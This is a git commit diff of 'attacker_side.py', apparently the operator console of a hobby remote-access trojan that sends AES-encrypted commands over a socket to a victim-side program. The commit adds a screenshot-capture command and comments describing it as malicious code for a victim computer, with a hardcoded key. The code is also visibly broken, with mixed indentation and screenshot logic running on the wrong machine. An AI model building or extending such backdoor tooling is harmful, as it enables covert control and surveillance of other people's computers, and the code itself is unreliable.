8b8b2c1604d8d145b4f9b989b328ad518d4acf08
Sarthak Gupta <789sk.gupta@gmail.com>
2019-07-06 16:18:31 +0530

    Update attacker_side.py

--- attacker_side.py
+++ attacker_side.py
@@ -1,17 +1,18 @@
 #!/usr/bin/env python
+# THIS IS A ATTACKETR side code ../---> malicious code to be run on victim computer...
 
 import os 
 import readline
 import socket
 
 import sys
-
+import string 
 from Crypto import Random
 from Crypto.Cipher import AES    # crypto.cipher method ->> python library for the symmetric encryption teqniques like aes/des/des3  with single symmetric key for encryption and decryption 
 
 
 try:
-    PORT = 829
+    PORT = 829   # should be customisable../
 except:
 
     print 'Usage: python file_name.py '
@@ -21,7 +22,7 @@ except:
     sys.exit(1)
 
 HOST = 'localhost'
-KEY  = '82e672ae054aa4de6f042c888111686a'
+KEY  = '82e672ae054aa4de6f042c888111686a'  # hardcoded key in the code for now-->temp//
 # generated the key as in victim_side code 
 
 def pad(s):
@@ -37,12 +38,31 @@ def encrypt(plaintext):
 
 
 def decrypt(ciphertext):
+	
     iv = ciphertext[:AES.block_size]
     cipher = AES.new(KEY, AES.MODE_CBC, iv)
     plaintext = cipher.decrypt(ciphertext[AES.block_size:])
     return plaintext.rstrip(b'\0')
 
 
+def screen_shot():
+	
+	try : 
+		hide_cmd = os.system("pip install pyscreenshot")
+		import pyscreenshot as ImageGrab
+		# fullscreen
+		im=ImageGrab.grab()
+		im.show()
+
+	# part of the screen
+		im=ImageGrab.grab(bbox=(10,10,500,500))
+		im.show()
+
+	# saving the to file
+		ImageGrab.grab_to_file('im.png')
+	except: 
+		print("some error occured while execution")
+	
 def main():
 
 	# initialising the network socket //
@@ -57,15 +77,18 @@ def main():
     while True:
 	# loop here to continue accept the command input suppplied by the attacker../
 
-        cmd = raw_input('ExploitWithMe> ').rstrip()
-
+        cmd = raw_input('ExploitWithMe >> ').rstrip()
+	
+	if cmd == 'grab_screen':
+	     screen_shot()
+	      hide_cmd = os.system("cat im.png")
         # allow noop
-        if cmd == '':
+        if cmd == '': # for nil input from user .../
             continue
 
         # send command to client
         conn.send(encrypt(cmd))
-
+	
         # stop server
         if cmd == 'terminate':
             s.close()
